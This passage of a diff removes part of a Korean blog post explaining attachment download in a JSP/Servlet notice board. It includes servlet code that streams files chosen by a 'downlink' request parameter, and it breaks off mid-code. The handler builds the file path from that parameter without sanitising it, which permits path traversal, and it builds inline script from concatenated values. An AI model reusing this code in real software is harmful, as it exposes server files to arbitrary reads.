-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 성공</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span> <span class="o">=</span> <span class="s">"&lt;script&gt;alert('success : "</span><span class="o">+</span><span class="n">noticeRe</span><span class="o">+</span><span class="s">"');location.href='"</span><span class="o">+</span><span class="n">noticeBoard</span><span class="o">+</span><span class="s">"'&lt;/script&gt;"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-</code></pre></div></div>
-
-<h2 id="파일-다운로드">파일 다운로드</h2>
-<ul>
-  <li>MIME를 이용하여 대용량 파일을 텍스트 문자 인코딩하여 전송한다.</li>
-</ul>
-
-<h3 id="게시판-첨부파일-다운로드">게시판 첨부파일 다운로드</h3>
-
-<h4 id="jsp-2">JSP</h4>
-<h5 id="설명-4">설명</h5>
-<ul>
-  <li>게시글 페이지 요청이 들어오면 첨부파일 링크도 추가한 게시글 페이지를 보여준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/53a6493d-3a0f-4824-9620-60ade8b0e641" alt="Pasted image 20230525030427" /></li>
-  <li>게시글에 업로드 된 파일의 다운로드 링크를 만들어준다.</li>
-  <li>다운로드 링크를 누르면 서버에 저장된 파일을 다운받을 수 있다.</li>
-  <li>첨부파일이 없을 경우 링크는 나타나지 않는다.</li>
-</ul>
-
-<h5 id="과정-4">과정</h5>
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsnpDshLjtnogg67O06riwIOyalOyyrVxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zquIAg7Y6Y7J207KeAIOydkeuLtVxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiDssqjrtoDtjIzsnbwg7YG066atXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyyqOu2gO2MjOydvCDri6TsmrTroZzrk5wg7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IO2XpOuNlCDsnpHshLFcbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog67KE7Y2866GcIOuCmOuIhOyWtCDsgqzsmqnsnpDsl5Dqsowg7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>
-
-<ol>
-  <li>사용자가 첨부파일 다운로드 링크를 클릭한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3315f5f4-0f61-4b81-a2de-736ea46e035c" alt="Pasted image 20230525025925" /></li>
-  <li>사용자는 서버로 파일 다운로드 get 요청을 보낸다.</li>
-  <li>서버는 사용자에게 파일을 버퍼로 쪼개어 응답을 보내준다.</li>
-  <li>다운로드 완료<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2e201d54-8fab-4691-9d9a-b6b47e3c6914" alt="Pasted image 20230525025952" /></li>
-</ol>
-
-<h5 id="코드--noticejsp-">코드 ( notice.jsp )</h5>
-
-<ul>
-  <li>파일 이름과 파일 위치 배열</li>
-  <li>servlet으로 부터 배열을 받아온다.</li>
-</ul>
-
-<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span>
-<span class="kt">var</span> <span class="n">fileNameList</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Pair</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="err">&gt;&gt;</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"fileNameList"</span><span class="o">);</span>
-<span class="nt">%&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>게시글 파일 다운로드 링크</li>
-</ul>
-
-<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">fileNameList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="err">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
-<span class="nt">&lt;tr&gt;</span>
-    <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"text-align: center;"</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;span&gt;</span>첨부파일<span class="nt">&lt;/span&gt;</span>
-    <span class="nt">&lt;/td&gt;</span>
-    <span class="nt">&lt;td&gt;</span>
-        <span class="nt">&lt;%</span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="n">file</span> <span class="o">:</span> <span class="n">fileNameList</span> <span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
-            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"${noticeBoardFileDownload}?downlink=</span><span class="nt">&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD2</span><span class="o">()</span> <span class="nt">%&gt;</span><span class="s">"</span><span class="nt">&gt;&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD1</span><span class="o">()</span> <span class="nt">%&gt;&lt;/a&gt;&lt;br&gt;</span>
-        <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span>
-    <span class="nt">&lt;/td&gt;</span>
-<span class="nt">&lt;/tr&gt;</span>
-<span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span>
-</code></pre></div></div>
-
-<h4 id="servlet-2">Servlet</h4>
-<h5 id="설명-5">설명</h5>
-<ul>
-  <li>게시글 페이지 요청이 들어오면 첨부파일 링크도 추가한 게시글 페이지를 보여준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f227ba6a-b0f9-4bc7-926b-49281fb03ca2" alt="Pasted image 20230525030435" /></li>
-  <li>다운로드 요청이 들어오면 서버에서 파일을 버퍼 단위로 쪼개어 사용자에게 전송한다.</li>
-  <li>다운로드 파일이 없으면 404 페이지를 보여준다.</li>
-</ul>
-
-<h5 id="과정-5">과정</h5>
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IO2MjOydvCDri6TsmrTroZzrk5wg7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOyhtOyerO2VmOuKlCDtjIzsnbzsnbjsp4Ag7ZmV7J24XG7shJzrsoQgLT4-IOyEnOuyhCA6IOyWtOuKkCDruIzrnbzsmrDsoIDsl5DshJwg7JioIOyalOyyreyduOyngCDtmZXsnbhcbuyEnOuyhCAtPj4g7ISc67KEIDog7Zek642UIOyekeyEsVxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDrsoTtjbzroZwg64KY64iE7Ja0IOyCrOyaqeyekOyXkOqyjCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>
-<ol>
-  <li>사용자가 다운로드 링크를 눌러 서버에 파일 다운로드 요청을 보낸다.</li>
-  <li>서버는 가장먼저 서버에 파일이 존재하는지 확인한다.</li>
-  <li>서버는 어느 브라우저에서 온 요청인지 확인한다.</li>
-  <li>위에서 알아본 정보를 가지고 응답 헤더를 작성한다.</li>
-  <li>서버는 파일을 버퍼 단위로 나누어 사용자에게 전달한다.</li>
-</ol>
-
-<h5 id="코드-mainpagejava-1">코드 (MainPage.java)</h5>
-
-<ul>
-  <li>게시글 파일 다운로드</li>
-  <li>사용자 브라우저가 모질라일 때만 다운로드가 가능하다.</li>
-  <li>헤더에 파일 사이즈를 입력하면 브라우저가 다운완료 시간을 예측한다.</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
-	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
-	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시글 파일 다운로드</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardFileDownload</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">downlink</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"downlink"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">filePath</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">downlink</span><span class="o">).</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"UTF-8"</span><span class="o">));</span> <span class="c1">// utf-8로 바꿔준다.</span>
-  
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">filePath</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">isFile</span><span class="o">()){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-  
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">filesize</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">sMimeType</span> <span class="o">=</span> <span class="n">getServletContext</span><span class="o">().</span><span class="na">getMimeType</span><span class="o">(</span><span class="n">filePath</span><span class="o">);</span> <span class="c1">// 확장자에 따라 달라진다.</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">sMimeType</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">sMimeType</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">==</span> <span class="mi">0</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">sMimeType</span> <span class="o">=</span> <span class="s">"application/octet-stream"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">BufferedInputStream</span> <span class="n">fin</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">BufferedOutputStream</span> <span class="n">outs</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">fileName</span><span class="o">=</span> <span class="n">downlink</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">"/"</span><span class="o">)[</span><span class="mi">1</span><span class="o">];</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">b</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">8192</span><span class="o">];</span>
-  
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="n">sMimeType</span><span class="o">+</span><span class="s">"; charset=utf-8"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">userAgent</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"User-Agent"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">userAgent</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">userAgent</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">userAgent</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"MSIE 5.5"</span><span class="o">)){</span> <span class="c1">// MSIE 5.5 이하</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">userAgent</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">userAgent</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"MSIE"</span><span class="o">)){</span> <span class="c1">// MS IE</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span><span class="o">{</span> <span class="c1">// 모질라</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response</span><span class="o">.</span><span class="na">setHeader</span><span class="o">(</span><span class="s">"Content-Disposition"</span><span class="o">,</span> <span class="s">"attachment; filename="</span><span class="o">+</span> <span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="n">fileName</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"utf-8"</span><span class="o">),</span> <span class="s">"latin1"</span><span class="o">)</span> <span class="o">+</span> <span class="s">";"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 파일 사이즈 정확히 알아야함</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">filesize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response</span><span class="o">.</span><span class="na">setHeader</span><span class="o">(</span><span class="s">"Content-Length"</span><span class="o">,</span> <span class="s">""</span><span class="o">+</span><span class="n">filesize</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">fin</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="n">file</span><span class="o">));</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">outs</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedOutputStream</span><span class="o">(</span><span class="n">response</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">int</span> <span class="n">read</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span><span class="o">((</span><span class="n">read</span><span class="o">=</span> <span class="n">fin</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">b</span><span class="o">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">outs</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">b</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">read</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">fin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">outs</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-</code></pre></div></div>
-
-<p><br /></p>
-<ul>
-  <li>글 자세히 보기</li>
-  <li>href 링크를 만들어 jsp 에 전달해 준다.</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
-	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
-	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 글 자세히 보기</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardDetail</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// *** 파일들 읽어 오기 ***</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// href 링크 만들기</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folderName</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getGenTime</span><span class="o">()+</span><span class="s">"_"</span><span class="o">+</span><span class="n">noticeSID</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">uploadPath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">folderName</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 파일 다운로드 get 파라미터 이름</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">fileNameList</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Pair</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="o">&gt;&gt;();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">uploadPath</span><span class="o">);</span> <span class="c1">// 폴더</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">folder</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
